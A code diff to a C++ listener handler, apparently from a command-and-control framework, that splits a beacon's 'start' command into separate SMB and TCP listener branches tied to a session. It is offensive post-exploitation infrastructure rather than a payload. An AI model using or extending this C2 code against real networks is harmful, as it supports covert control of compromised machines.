@@ -343,12 +343,12 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 					std::string delimiter = " ";
 					splitList(cmd, delimiter, splitedCmd);
 
-					if(splitedCmd[0]==StartCmd)
+					if(splitedCmd[0]==StartCmd && splitedCmd[1]=="smb")
 					{
-						int localPort = std::stoi(splitedCmd[2]);
+						int localPort = 0;
 						
-						std::string type=ListenerTcpType;
-						std::string host;
+						std::string type=ListenerSmbType;
+						std::string host="127.0.0.1";
 
 						std::shared_ptr<Session> ptr = getSessionPtr(beaconHash);
 						if(ptr)
@@ -356,7 +356,21 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 
 						addSessionListener(beaconHash, c2Message.returnvalue(), type, host, localPort);
 					}
-					if(splitedCmd[0]==StopCmd)
+					if(splitedCmd[0]==StartCmd && splitedCmd[1]=="tcp")
+					{
+						// TODO
+						int localPort = std::stoi(splitedCmd[3]);
+						
+						std::string type=ListenerTcpType;
+						std::string host="127.0.0.1";
+
+						std::shared_ptr<Session> ptr = getSessionPtr(beaconHash);
+						if(ptr)
+							host = ptr->getHostname();
+
+						addSessionListener(beaconHash, c2Message.returnvalue(), type, host, localPort);
+					}
+					else if(splitedCmd[0]==StopCmd)
 					{
 						rmSessionListener(beaconHash, c2Message.returnvalue());
 					}
